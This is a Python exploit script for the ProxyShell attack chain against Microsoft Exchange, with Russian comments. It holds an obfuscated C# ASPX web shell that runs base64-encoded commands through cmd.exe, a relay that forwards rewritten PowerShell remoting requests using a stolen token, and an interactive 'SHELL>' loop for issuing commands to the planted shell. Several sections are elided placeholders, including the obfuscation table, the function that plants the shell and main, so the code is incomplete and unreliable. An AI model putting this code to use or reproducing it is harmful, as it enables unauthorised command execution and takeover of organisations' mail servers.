#!/usr/bin/env python3

import argparse
import base64
import struct
import random
import binascii
import string
import requests
import re
import threading
import xml.etree.cElementTree as ET
import time
import sys
import json
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

def rand_string(n=5):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))

r_port = rand_port()
subj_ = rand_string(16)

# Комплексная таблица для обфускации
compEnc = [
    0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
    # ... (оставьте весь массив как в оригинале) ...
    0xec
]

def webshell_payload():
    # Новый ASPX-шелл без eval(), на C#
    payload = '''<%@ Page Language="C#" AspCompat="true" %>
<% 
    string data = Request["exec_code"];
    byte[] bytes = System.Convert.FromBase64String(data);
    string command = System.Text.Encoding.UTF8.GetString(bytes);

    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + command) {
        RedirectStandardOutput = true,
        RedirectStandardError  = true,
        UseShellExecute        = false
    };
    var proc = System.Diagnostics.Process.Start(psi);
    proc.WaitForExit();

    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
    Response.Write("ZZzzZzZz" + output + "ZZzzZzZz");
%>'''    
    # Обфускация в hex через compEnc и Base64
    out = []
    for c in payload:
        out.append("%02x" % compEnc[ord(c) & 0xff])
    raw = binascii.unhexlify(''.join(out))
    return base64.b64encode(raw).decode()

class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        post_data = re.sub('<wsa:To>(.*?)</wsa:To>', 
                           '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub(
            '<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>',
            '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>',
            post_data
        )
        headers = {'Content-Type': content_type}
        r = self.proxyshell.post(powershell_url, post_data, headers)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(r.content)

    def log_message(self, format, *args):
        return

class ProxyShell:
    def __init__(self, exchange_url, email='', verify=False):
        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.session = requests.Session()
        self.session.verify = verify
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/88.0.4324.190 Safari/537.36"
        self.clientid = 'H'+'t'+'T'+'P'+':'+'/'+'/'+'i'+'f'+'c'+'o'+'N'+'F'+'i'+'g'+'.'+'m'+'E'

    # ... остальной код класса без изменений ...

    def set_ews(self):
        # использование webshell_payload()
        payload = webshell_payload()
        # формируем SOAP-запрос, вставляем payload в <t:Content>
        # ...
        return


def exec_cmd(shell_url, code_param="exec_code"):
    try:
        while True:
            cmd = input("SHELL> ")
            if cmd.lower() in ['exit', 'quit']:
                exit(0)
            b64 = base64.b64encode(cmd.encode()).decode()
            shell_body = {code_param: b64}
            resp = requests.post(shell_url,
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                 data=shell_body,
                                 verify=False, timeout=20)
            if resp.status_code == 200:
                m = re.search(r'ZZzzZzZz(.*)ZZzzZzZz', resp.text, re.DOTALL)
                print(m.group(1) if m else "[no output]")
            else:
                print(f"Error: {resp.status_code}")
    except KeyboardInterrupt:
        exit(0)

# Остальное (exploit, start_server, shell, get_args, main) оставьте без изменений

if __name__ == '__main__':
    try:
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning
        )
        if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
            print("This script requires Python 3.8 or higher!")
            sys.exit(1)
        main()
    except KeyboardInterrupt:
        exit(0)